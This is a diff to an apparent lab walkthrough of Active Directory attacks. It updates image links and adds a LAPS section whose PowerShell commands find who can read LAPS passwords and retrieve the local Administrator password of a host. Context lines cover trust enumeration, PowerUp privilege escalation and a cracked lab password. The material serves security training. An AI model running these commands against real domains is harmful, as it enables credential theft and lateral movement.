@@ -22,7 +22,7 @@ Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_S
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/immagine.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (2).png" alt=""><figcaption></figcaption></figure>
 
 The trust is bidirectional, so enumerate the trust that eu.local has
 
@@ -30,7 +30,7 @@ The trust is bidirectional, so enumerate the trust that eu.local has
 Get-ForestTrust -Forest eu.local
 ```
 
-<figure><img src="../.gitbook/assets/immagine (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## FLAG 5/6/7 - Name of the service for privesc on local machine
 
@@ -43,7 +43,7 @@ Use PowerUp to find a privesc
 Invoke-AllChecks
 ```
 
-<figure><img src="../.gitbook/assets/immagine (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 And exploit the service
 
@@ -188,3 +188,44 @@ Now crack it. The password is _Desk@123_
 
 ## Flag 10 -  LAPS
 
+To enumerate LAPS import the module AdmPwd.PS.psd1, AD-Module and use the script Get-LapsPermissions.ps1
+
+<figure><img src="../.gitbook/assets/immagine.png" alt=""><figcaption></figcaption></figure>
+
+Also powerview can be used
+
+{% code overflow="wrap" %}
+```powershell
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (1).png" alt=""><figcaption></figcaption></figure>
+
+So, the studentusers group can read password for LAPS managed Administrator on the us-mgmt machine. Let's try it using the Active Directory module, LAPS module and PowerView.
+
+{% tabs %}
+{% tab title="AD-Module" %}
+
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="PowerView" %}
+{% code overflow="wrap" %}
+```powershell
+Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="LAPS Module" %}
+```powershell
+Get-AdmPwdPassword -ComputerName us-mailmgmt
+```
+{% endtab %}
+{% endtabs %}
